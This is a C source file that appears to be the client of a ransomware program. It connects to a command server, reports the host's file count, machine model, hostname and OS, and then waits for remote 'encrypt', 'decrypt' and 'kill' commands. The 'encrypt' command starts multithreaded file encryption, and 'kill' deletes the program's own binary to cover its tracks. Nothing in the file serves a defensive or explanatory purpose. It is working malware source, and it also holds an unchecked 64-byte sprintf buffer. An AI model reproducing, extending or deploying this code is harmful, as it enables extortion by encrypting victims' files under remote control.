#include <stdbool.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "../../headers/client.h"
#include "../../headers/thread.h"
#include "../../headers/watcher.h"
#include "../../headers/globals.h"

const int THREADS_NUMBER = 8;

char* get_computer_model() {
    FILE *f = fopen("/sys/devices/virtual/dmi/id/product_name", "r");
    if (!f)
        return strdup("Unknown");

    char tmp[128];
    fgets(tmp, sizeof(tmp), f);
    fclose(f);

    tmp[strcspn(tmp, "\n")] = '\0';
    return strdup(tmp);
}

#define PORT 8080
void *commands_listener(void *arg) {
    int client_fd = *(int *)arg;
    free(arg);

    char buffer[1024];

    while (true){
        int valread = read(client_fd, buffer, sizeof(buffer) -1);

        if (valread > 0 ) {
            buffer[valread] = '\0';
            char *arguments[10] = {0};
            int argc = 0;

            char *token = strtok(buffer, ";");
            while (token != NULL && argc < 10) {
                arguments[argc++] = token;
                token = strtok(NULL, ";");
            }

            if (strcmp(arguments[0], "encrypt") == 0) {
                printf("start_encryption\n");
                initialize_threads(THREADS_NUMBER, true);
                encryption_active = true;
            } else if (strcmp(arguments[0], "decrypt") == 0) {
                printf("start_decryption\n");
                encryption_active = false;
                initialize_threads(THREADS_NUMBER, false);
            } else if (strcmp(arguments[0], "kill") == 0) {
                printf("kill himself\n");
                char exe_path[1024];

                ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
                if (len == -1) {
                    perror("readlink failed");
                    return 0;
                }
                exe_path[len] = '\0';

                printf("Deleting: %s\n", exe_path);

                if (unlink(exe_path) == 0) {
                    printf("Deleted successfully.\n");
                } else {
                    perror("unlink failed");
                }
                exit(0);
            } else {
                for (int i = 0; i < argc; i++) {
                    printf("%s\n", arguments[i]);
                }
            }
        }
    }
}

int startclient() {
    int status;
    int valread;
    int client_fd;

    struct sockaddr_in serv_addr;

    if ((client_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("socket creation failed\n");
        return -1;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) { //127.0.0.1, 10.172.20.145
        printf("inet_pton failed\n");
        return -1;
    }
    if ((status = connect(client_fd, (struct sockaddr *) &serv_addr, sizeof(serv_addr))) < 0) {
        printf("connect failed\n");
        return -1;
    }

    char* hey = "PC connected, number of file : ";

    struct utsname name;

    if (uname(&name) == -1) {
        perror("uname");
        return 1;
    }
    char* nodename = name.nodename;
    char* sysname = name.sysname;
    //char* machine = name.machine;
    //char* version = name.version;
    //char* release = name.release;

    int file_number = count(&queue);

    char *model = get_computer_model();

    char ret[64];
    sprintf(ret, "%s %d, model: %s, username: %s, OS kernel: %s", hey, file_number, model, nodename, sysname);
    send(client_fd, ret, strlen(ret), 0);
    free(model);

    int *clientfd = malloc(sizeof(int));
    *clientfd = client_fd;

    pthread_t command_tid;
    pthread_t watcher_tid;
    pthread_create(&command_tid, NULL, commands_listener, clientfd);
    pthread_create(&watcher_tid, NULL, start_watcher, NULL);
    pthread_join(watcher_tid, NULL);
    pthread_join(command_tid, NULL);
    return client_fd;
}